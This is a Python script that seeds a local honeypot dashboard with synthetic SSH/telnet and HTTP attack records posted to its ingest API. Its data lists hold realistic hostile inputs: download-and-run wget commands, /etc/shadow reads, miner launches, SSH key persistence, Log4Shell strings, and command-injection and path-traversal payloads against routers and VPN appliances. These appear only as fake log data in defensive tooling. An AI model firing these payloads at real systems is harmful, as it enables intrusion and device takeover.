"""LOCAL PREVIEW ONLY: stream synthetic honeypot records into the core so the
globe and geo views have something to show before sensors face the internet.

Records go through the real /api/ingest -> worker path under sensor id "demo".
Source IPs are random public addresses, so NEVER run this against a production
core or publish screenshots of it as real data. Remove it afterwards with --purge.

    python seed.py --rate 5            # ~5 events/sec until Ctrl+C
    python seed.py --purge             # delete all demo events (needs psql access via docker)
"""
import argparse
import datetime as dt
import ipaddress
import json
import random
import subprocess
import time
import uuid

import httpx

USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user", "pi", "git", "support", "guest", "ftpuser"]
PASSWORDS = ["123456", "admin", "password", "root", "12345678", "1234", "qwerty", "P@ssw0rd", "admin123", "123", "raspberry", "toor", "", "Passw0rd!"]
COMMANDS = [
    "uname -a", "cat /proc/cpuinfo | grep name | wc -l", "whoami", "free -m", "ls -la", "crontab -l",
    "cd /tmp; wget http://{ip}/bins/x86; chmod 777 x86; ./x86", "echo \"root:Xk29fh\"|chpasswd",
    "cat /etc/shadow", "history -c; rm -rf ~/.bash_history", "./xmrig -o stratum+tcp://{ip}:3333 -u x",
    "echo ssh-rsa AAAAB3Nza... >> ~/.ssh/authorized_keys", "ps aux | grep -v grep | grep miner",
]
HTTP = [
    ("GET", "/.env", {}), ("GET", "/.git/config", {}), ("POST", "/wp-login.php", {}),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {}),
    ("GET", "/", {"User-Agent": "${jndi:ldap://{ip}:1389/a}"}),
    ("POST", "/GponForm/diag_Form?images/", {}), ("POST", "/ctrlt/DeviceUpgrade_1", {}),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", {}),
    ("POST", "/ssl-vpn/hipreport.esp", {"Cookie": "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/x`curl${IFS}{ip}`"}),
    ("GET", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", {}),
    ("GET", "/api/v1/totp/user-backup-code/../../license/keys-status/x", {}),
    ("POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", {}), ("GET", "/phpmyadmin/", {"User-Agent": "zgrab/0.x"}),
    ("POST", "/_ignition/execute-solution", {}), ("GET", "/SDK/webLanguage", {}),
]
BODIES = {
    "/GponForm/diag_Form?images/": "XWebPageName=diag&diag_action=ping&dest_host=`busybox+wget+http://{ip}/g`;sh",
    "/ctrlt/DeviceUpgrade_1": "<NewStatusURL>$(/bin/busybox wget -g {ip} -l /tmp/m -r /mips)</NewStatusURL>",
    "/wp-login.php": "log=admin&pwd={pw}",
}


def public_ip() -> str:
    while True:
        ip = ipaddress.IPv4Address(random.getrandbits(32))
        if ip.is_global and not ip.is_multicast:
            return str(ip)


def now():
    return dt.datetime.now(dt.timezone.utc).isoformat().replace("+00:00", "Z")


def ssh_session(ip: str) -> list[dict]:
    sid = uuid.uuid4().hex[:12]
    proto, port = random.choice([("ssh", 22), ("ssh", 22), ("telnet", 23)])
    base = {"src_ip": ip, "session": sid, "honeypot": "cowrie"}
    recs = [base | {"eventid": "cowrie.session.connect", "src_port": random.randint(30000, 65000), "dst_port": port,
                    "protocol": proto, "timestamp": now()}]
    for _ in range(random.randint(1, 6)):
        recs.append(base | {"eventid": "cowrie.login.failed", "username": random.choice(USERS),
                            "password": random.choice(PASSWORDS), "timestamp": now()})
    if random.random() < 0.35:
        recs.append(base | {"eventid": "cowrie.login.success", "username": "root", "password": random.choice(PASSWORDS), "timestamp": now()})
        for c in random.sample(COMMANDS, random.randint(2, 5)):
            recs.append(base | {"eventid": "cowrie.command.input", "input": c.format(ip=public_ip()), "timestamp": now()})
        if random.random() < 0.3:
            recs.append(base | {"eventid": "cowrie.session.file_download", "url": f"http://{public_ip()}/bins/x86",
                                "shasum": f"{random.getrandbits(256):064x}", "timestamp": now()})
    recs.append(base | {"eventid": "cowrie.session.closed", "duration": "4.2", "timestamp": now()})
    return recs


def http_request(ip: str) -> dict:
    method, path, headers = random.choice(HTTP)
    headers = {k: v.replace("{ip}", public_ip()) for k, v in headers.items()}
    headers.setdefault("User-Agent", random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "curl/7.88.1", "python-requests/2.31", "Go-http-client/1.1"]))
    body = BODIES.get(path, "").replace("{ip}", public_ip()).replace("{pw}", random.choice(PASSWORDS))
    rec = {"honeypot": "http", "ts": now(), "src_ip": ip, "src_port": random.randint(30000, 65000),
           "dst_port": random.choice([80, 80, 443, 8080, 37215]), "method": method, "path": path, "headers": headers, "body": body}
    if path == "/wp-login.php":
        rec["creds"] = {"username": "admin", "password": body.split("pwd=")[1], "source": "form"}
    return rec


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--core", default="http://localhost:8000")
    ap.add_argument("--token", default="demo-token")
    ap.add_argument("--rate", type=float, default=4, help="sessions/requests per second")
    ap.add_argument("--purge", action="store_true")
    a = ap.parse_args()
    if a.purge:
        subprocess.run(["docker", "compose", "-f", "core/docker-compose.yml", "exec", "-T", "db", "psql", "-U", "honeyjar",
                        "-c", "DELETE FROM events WHERE sensor_id = 'demo'"], check=True)
        return
    # A fixed pool of "attackers" so repeat offenders show up in the rankings.
    pool = [public_ip() for _ in range(300)]
    with httpx.Client(timeout=10) as c:
        while True:
            ip = random.choice(pool)
            recs = ssh_session(ip) if random.random() < 0.55 else [http_request(ip)]
            r = c.post(f"{a.core}/api/ingest", content=json.dumps(recs), headers={"Authorization": f"Bearer {a.token}"})
            r.raise_for_status()
            time.sleep(random.expovariate(a.rate))


if __name__ == "__main__":
    main()
